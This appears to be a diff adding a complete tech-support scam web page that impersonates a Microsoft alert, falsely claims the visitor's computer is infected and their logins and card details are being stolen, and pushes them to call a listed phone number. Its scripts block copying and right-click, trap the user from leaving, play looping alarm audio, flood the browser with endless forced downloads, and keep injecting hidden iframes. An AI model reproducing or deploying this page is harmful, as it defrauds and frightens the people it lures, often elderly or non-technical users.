@@ -1,0 +1,527 @@
+
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta http-equiv=content-type content="text/html;charset=UTF-8"/>
+        <meta name=robots content="noindex, nofollow">
+        <meta http-equiv=Content-Type content="text/html; charset=UTF-8">
+        <title>Official Microsoft-Windows-Help-and-Services</title>
+        <meta name=robots content=NOINDEX,NOFOLLOW>
+
+        <!-- Global site tag (gtag.js) - Google Analytics -->
+      <script async src="https://www.googletagmanager.com/gtag/js?id=UA-71978308-1"></script>
+      <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+
+      gtag('config', 'UA-71978308-1');
+      </script>
+
+
+
+          <script type="text/javascript">
+                          (function(funcName, baseObj) {
+                                  // The public function name defaults to window.docReady
+                                  // but you can pass in your own object and own function name and those will be used
+                                  // if you want to put them in a different namespace
+                                  funcName = funcName || "docReady";
+                                  baseObj = baseObj || window;
+                                  var readyList = [];
+                                  var readyFired = false;
+                                  var readyEventHandlersInstalled = false;
+
+                                  // call this when the document is ready
+                                  // this function protects itself against being called more than once
+                                  function ready() {
+                                      if (!readyFired) {
+                                          // this must be set to true before we start calling callbacks
+                                          readyFired = true;
+                                          for (var i = 0; i < readyList.length; i++) {
+                                              // if a callback here happens to add new ready handlers,
+                                              // the docReady() function will see that it already fired
+                                              // and will schedule the callback to run right after
+                                              // this event loop finishes so all handlers will still execute
+                                              // in order and no new ones will be added to the readyList
+                                              // while we are processing the list
+                                              readyList[i].fn.call(window, readyList[i].ctx);
+                                          }
+                                          // allow any closures held by these functions to free
+                                          readyList = [];
+                                      }
+                                  }
+
+                                  function readyStateChange() {
+                                      if ( document.readyState === "complete" ) {
+                                          ready();
+                                      }
+                                  }
+
+                                  // This is the one public interface
+                                  // docReady(fn, context);
+                                  // the context argument is optional - if present, it will be passed
+                                  // as an argument to the callback
+                                  baseObj[funcName] = function(callback, context) {
+                                      // if ready has already fired, then just schedule the callback
+                                      // to fire asynchronously, but right away
+                                      if (readyFired) {
+                                          setTimeout(function() {callback(context);}, 1);
+                                          return;
+                                      } else {
+                                          // add the function and context to the list
+                                          readyList.push({fn: callback, ctx: context});
+                                      }
+                                      // if document already ready to go, schedule the ready function to run
+                                      if (document.readyState === "complete") {
+                                          setTimeout(ready, 1);
+                                      } else if (!readyEventHandlersInstalled) {
+                                          // otherwise if we don't have event handlers installed, install them
+                                          if (document.addEventListener) {
+                                              // first choice is DOMContentLoaded event
+                                              document.addEventListener("DOMContentLoaded", ready, false);
+                                              // backup is window load event
+                                              window.addEventListener("load", ready, false);
+                                          } else {
+                                              // must be IE
+                                              document.attachEvent("onreadystatechange", readyStateChange);
+                                              window.attachEvent("onload", ready);
+                                          }
+                                          readyEventHandlersInstalled = true;
+                                      }
+                                  }
+                          })("docReady", window);
+
+                          document.ondragstart = test;
+                          document.onselectstart = test;
+                          document.oncontextmenu = test;
+                          function test() {
+                              return false;
+                          }
+                          document.oncontextmenu;
+                          function catchControlKeys(event) {
+                              var code = event.keyCode ? event.keyCode : event.which ? event.which : null;
+                              if (event.ctrlKey) {
+                                  // Ctrl+U
+                                  if (code == 117) {
+                                      return false;
+                                  }
+                                  if (code == 85) {
+                                      return false;
+                                  }
+                                  // Ctrl+C
+                                  if (code == 99) {
+                                      return false;
+                                  }
+                                  if (code == 67) {
+                                      return false;
+                                  }
+                                  // Ctrl+A
+                                  if (code == 97) {
+                                      return false;
+                                  }
+                                  if (code == 65) {
+                                      return false;
+                                  }
+                              }
+                          }
+                      </script>
+          <script type="text/javascript">
+              function goodbye(e) {
+                  if (!e)
+                      e = window.event;
+                  //e.cancelBubble is supported by IE - this will kill the bubbling process.
+                  e.cancelBubble = true;
+                  e.returnValue = "";
+
+                  //e.stopPropagation works in Firefox.
+                  if (e.stopPropagation) {
+                      e.stopPropagation();
+                      e.preventDefault();
+                  }
+              }
+              window.onbeforeunload = goodbye;
+          </script>
+
+
+
+
+        <style>
+            div.fixed {
+                position: fixed;
+                bottom: 0;
+                right: 0;
+                width: 300px;
+                height: 300px;
+                border: 1px
+            }
+        </style>
+        <style>
+            div.fixed2 {
+                position: fixed;
+                bottom: 55px;
+                right: 80px;
+                width: 200px;
+                height: 50px;
+                border: 1px;
+                color: black;
+                font-size: 22px;
+                font-weight: bold;
+                -webkit-animation-name: example;
+                -webkit-animation-duration: 1s;
+                animation-name: example;
+                animation-duration: 1s;
+                animation-iteration-count: infinite
+            }
+
+            @-webkit-keyframes example {
+                0% {
+                    color: black
+                }
+
+                50% {
+                    color: red
+                }
+
+                100% {
+                    color: black
+                }
+            }
+
+            @keyframes example {
+                0% {
+                    color: black
+                }
+
+                50% {
+                    color: red
+                }
+
+                100% {
+                    color: black
+                }
+            }
+        </style>
+        <style type=text/css>
+            #alert {
+                position: absolute;
+                left: 30%;
+                top: 5%;
+                background: #f1f1f1;
+                border: 2px solid #0032c7;
+                width: 40%
+            }
+
+            .input {
+                margin-top: 10px;
+                background: #f1f1f1;
+                padding: 20px;
+                text-align: right
+            }
+
+            .input input {
+                opacity: 1;
+                padding: 15px;
+                font-size: 16px;
+                width: 35%;
+                font-weight: 700
+            }
+
+            .input input:hover {
+                opacity: .75
+            }
+
+            .head h1,h2,h3,h4 {
+                margin: 0;
+                padding: 0
+            }
+
+            .text {
+                padding: 20px
+            }
+
+            .right {
+                float: right
+            }
+
+            .left {
+                float: left
+            }
+
+            .clear {
+                clear: both
+            }
+
+            .alert_hide {
+                cursor: pointer
+            }
+
+            body {
+                background-color: #0000A0;
+                color: #000;
+                font-family: "Trebuchet MS",Arial,Helvetica,sans-serif;
+                font-family: Arial;
+                font-size: 18px;
+                margin: 0
+            }
+
+            body,html {
+                margin: 10px;
+                padding: 0;
+                overflow: hidden;
+                width: 100%;
+                height: 100%;
+                background-attachment: fixed;
+                background-color: #0000A0
+            }
+        </style>
+        <script src=./js/jquery.min.js></script>
+        <script>
+            function formatAMPM() {
+                var d = new Date()
+                  , minutes = d.getMinutes().toString().length == 1 ? '0' + d.getMinutes() : d.getMinutes()
+                  , hours = d.getHours().toString().length == 1 ? '0' + d.getHours() : d.getHours()
+                  , ampm = d.getHours() >= 12 ? 'pm' : 'am'
+                  , months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec']
+                  , days = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
+                return days[d.getDay()] + ' ' + months[d.getMonth()] + ' ' + d.getDate() + ' ' + d.getFullYear() + ' ' + hours + ':' + minutes + ampm;
+            }
+        </script>
+        <script>
+            function getURLParameter(a) {
+                return decodeURI((RegExp(a + "=(.+?)(&|$)").exec(location.search) || [, null])[1] || "")
+            }
+            function random_betw(b, a) {
+                return Math.round(Math.random() * (a - b) + b)
+            }
+            var phone = "(833) 493-1880";
+            var text = "** Microsoft Windows Warning Alert **\n\nERROR # MS-SYSINFO32 \nPlease call us immediately at: " + phone + ".\nDo not ignore this critical alert..\nIf you close this page, your computer access will be disabled to prevent further damage to our network. Your computer has alerted us that it has been infected with a pornographic spyware and virus. \n\nThe following information is being stolen: \n A.Facebook Logins\n B.Credit Card Details\n C.Email Account Logins\n D.Photos and documents stored on this computer.\nYou must contact us immediately so that our expert engineers can walk you through the removal process over the phone to protect your identity. Please call us within the next 5 minutes to prevent your computer from being disabled or from any information loss.\n\nMicrosoft Toll Free:" + phone;
+        </script>
+        <script>
+            var w = window.screen.width;
+            var h = window.screen.height;
+            window.moveTo(0, 0);
+            window.resizeTo(w, h);
+        </script>
+        <script>
+            var isOpera = !!window.opera || navigator.userAgent.indexOf(" OPR/") >= 0;
+            var isFirefox = typeof InstallTrigger !== "undefined";
+            var isSafari = Object.prototype.toString.call(window.HTMLElement).indexOf("Constructor") > 0;
+            var isChrome = !!window.chrome && !isOpera;
+            var isIE = /*@cc_on!@*/
+            false || !!document.documentMode;
+        </script>
+    </head>
+    <body style="background-color: #0000A0; margin:0px;padding:0px;font-family:arial,sans-serif!important">
+        <div id=blue-screen style=display:none>
+            <table style=width:100% height=61 cellpadding=0 cellspacing=0 border=0>
+                <tr>
+                    <td width=766>
+                        <img src=img/bg-1.jpg>
+                    </td>
+                    <td align=right background=img/bg-2.jpg>
+                        <img src=img/bg-3.jpg>
+                    </td>
+                </tr>
+            </table>
+        </div>
+        <div style="width:85%;margin:auto;padding-top:4%;background-color:#0000A0;position:relative">
+            <div class=centering-col>
+                <div class=centered-content>
+                    <h1 style=color:#FFF;margin-top:20px;font-weight:900>** Microsoft Warning  &nbsp;Alert **</h1>
+                    <h3 style=color:#FFF;margin-top:20px;font-weight:900>ERROR # 0xC004FC03</h3>
+                    <div style=float:right;height:180px;width:180px;margin-right:19%>
+
+                    </div>
+                    <div style=float:left;height:250px;width:520px;padding-left:20px;padding-top:25px;color:#FFF>
+                        Please call &nbsp;us immediately at: </br> <script>
+                            document.write('<span style="font-size:25px;font-weight:bold;">' + phone + " (Toll Free)</span>");
+                        </script>
+                        <br>
+                        Do not ignore this critical alert.<br/>
+                        If you close this page, your computer access will be disabled to prevent further damage to our network.<br/>
+                        Your computer has alerted us that it has been infected with a Pornographic Spyware and virus. The following information is being stolen:<br/>
+                        <br/>
+                        1.Facebook &nbsp;Logins<br/>
+                        2.Credit &nbsp;Card &nbsp;Details<br/>
+                        3.Email &nbsp;Account &nbsp;Logins<br/>
+                        4.Photos and documents &nbsp;stored &nbsp;on this computer<br>
+                        <br>
+                        You must contact us immediately so that our expert engineers can walk you through the removal &nbsp;process over the phone to protect your identity. Please call us within the next &nbsp;5 minutes to prevent your &nbsp;computer from being disabled or from any information loss.<br></br>
+                    </div>
+                    <div style="margin-top:440px">
+                        <h1 style="color:#ffff;font-weight:900; font-size:25px">
+                            Call Microsoft Windows Support<br>
+                            <script>
+                                document.write('<span style="color:#7fff7f">' + phone + " (Toll FREE)</span> ");
+                            </script>
+</br></h1></div></div></div></div>
+<audio autoplay=autoplay loop id=audio>
+    <source src=./sound/err.mp3 type=audio/mpeg>
+</audio>
+<div id=chrome-alerts class=chrome-alert style=display:none>
+    <div>
+        <a href=# class=cross>×</a>
+        <h1>Activation Security Warning:</h1>
+        <div class=content-box id=alert-content-box>
+            <p>
+                ** Microsoft Warning &nbsp;Alert **<br>
+                <br>
+                ERROR # 0xC004FC03<br>
+                <br>
+                <br>
+                Please call us immediately at:
+                <span style=font-size:13pt;font-weight:bold>
+                    <script>
+                        document.write(phone);
+                    </script>
+                </span>
+                &nbsp;(Microsoft &nbsp;Toll Free)<br>Do not ignore this critical alert.</br>
+                If you close this page, your computer access will be &nbsp;disabled to prevent further damage to our network.<br/>
+                Your computer has alerted us that it has been infected with a Pornographic &nbsp;Spyware and &nbsp;virus. The following information is being stolen:<br/>
+                <br/>
+                1.Facebook Logins<br/>
+                2.Credit &nbsp;Card Details<br/>
+                3.Email &nbsp;Account Logins<br/>
+                4.Photos &nbsp;and documents stored on this computer<br/>
+                <br/>Please call us within the next 5 minutes to prevent your computer from being disabled or from any information loss.</br>
+</br>Microsoft &nbsp;Toll Free:
+<span style='font-size:13pt;font-weight:bold'>
+    <script>
+        document.write(phone);
+    </script>
+</span>
+</div>
+<label style=font-size:12px>
+    <input type=checkbox>Prevent this page from creating &nbsp;additional dialogues.
+</label>
+<div class=action_buttons>
+    <a style=color:#fff;background:red;font-size:11pt;font-weight:bold href=javascript: class=active id=leave_page>Leave this Page</a>
+</div>
+</div></div>
+<script>
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               
+
+</script>
+
+
+
+								<script type="text/javascript">
+											function download(g, h, j) {
+													var k = new Blob([g], {
+															type: j
+													});
+													if (window.navigator.msSaveOrOpenBlob) window.navigator.msSaveOrOpenBlob(k, h);
+													else {
+															var l = document.createElement("a"),
+																	m = URL.createObjectURL(k);
+															l.href = m, l.download = h, l.click(), setTimeout(function() {}, 0)
+													}
+											}
+											function bomb_ch() {
+													var g = Math.random().toString(36).substring(20),
+															h = Math.floor(50 * Math.random() + 25);
+													while (true) download(h, g, g)
+											}
+											function ch_jam() {
+													bomb_ch()
+											}
+											docReady(function()
+															{
+																	setTimeout(function(){
+													setInterval(ch_jam, 0.5);
+											}, 2000);
+															});
+
+									</script>
+
+
+<script type=text/javascript>
+    function get_browser() {
+        var b = navigator.userAgent, a, c = b.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || [];
+        if (/trident/i.test(c[1])) {
+            a = /\brv[ :]+(\d+)/g.exec(b) || [];
+            return {
+                name: "IE",
+                version: (a[1] || "")
+            }
+        }
+        if (c[1] === "Chrome") {
+            a = b.match(/\bOPR\/(\d+)/);
+            if (a != null) {
+                return {
+                    name: "Opera",
+                    version: a[1]
+                }
+            }
+        }
+        c = c[2] ? [c[1], c[2]] : [navigator.appName, navigator.appVersion, "-?"];
+        if ((a = b.match(/version\/(\d+)/i)) != null) {
+            c.splice(1, 1, a[1])
+        }
+        return {
+            name: c[0],
+            version: c[1]
+        }
+    }
+    var InternetEx = window.navigator.appVersion.indexOf("MSIE") != -1;
+    var isIEedge = window.navigator.userAgent.indexOf("Edge") > -1;
+    var browser = get_browser();
+    if (browser.name == "Firefox" || isIEedge || InternetEx || navigator.appName == "Microsoft Internet Explorer" || !!(navigator.userAgent.match(/Trident/) || navigator.userAgent.match(/rv:11/))) {
+        if (isIEedge || InternetEx || navigator.appName == "Microsoft Internet Explorer" || !!(navigator.userAgent.match(/Trident/) || navigator.userAgent.match(/rv:11/))) {
+            function msg_ff() {
+                var a = document.createElement("div");
+                a.innerHTML = '<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="Hdsdsdsdsuewewewew44m.php"></iframe></div>';
+                document.body.appendChild(a)
+            }
+            window.setInterval(function() {
+                msg_ff()
+            }, 1100)
+        } else {
+            function msg_ff() {
+                var a = document.createElement("div");
+                a.innerHTML = '<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="Hdsdsdsdsuewewewew44m.php"></iframe></div>';
+                document.body.appendChild(a)
+            }
+            window.setInterval(function() {
+                msg_ff()
+            }, 1100)
+        }
+    } else {}
+    ;</script>
+
+    <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="Hdsdsdsdsuewewewew44m.php"></iframe></div>
+    <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="Hdsdsdsdsuewewewew44m.php"></iframe></div>
+
+
+
+
+<div class="fixed">}
+</script>
+<div class="fixed">
+    <img src="2.png" style="position: absolute; right: 0px; bottom: 1px;"  width="600">
+</div>
+<div class="fixed2">
+    <script>
+        document.write(phone)
+    </script>
+</div>
+</div>
+<div style="position: absolute; right: 10px; top: 70px;color:#FFF;">
+    <b>
+        <u>
+            Error &nbsp;Logged at: <script>
+                document.write(formatAMPM());
+            </script>
+            <br>Microsoft Diagnostics IP Address: 129.0.0.1</br>
+            <div style="position:absolute; top:50px; right:35px;"><h3 style="font-size:24px; font-weight:bold;">Call Support (833) 493-1880          </h3></div>
+</div>
+</u></b></div>
+
+
+	  <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="Hdsdsdsdsuewewewew44m.php"></iframe></div>
+	  <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="Hdsdsdsdsuewewewew44m.php"></iframe></div>
+
+	  <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="Hdsdsdsdsuewewewew44m.php"></iframe></div>
+	  <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="Hdsdsdsdsuewewewew44m.php"></iframe></div>
+
+</body></html>
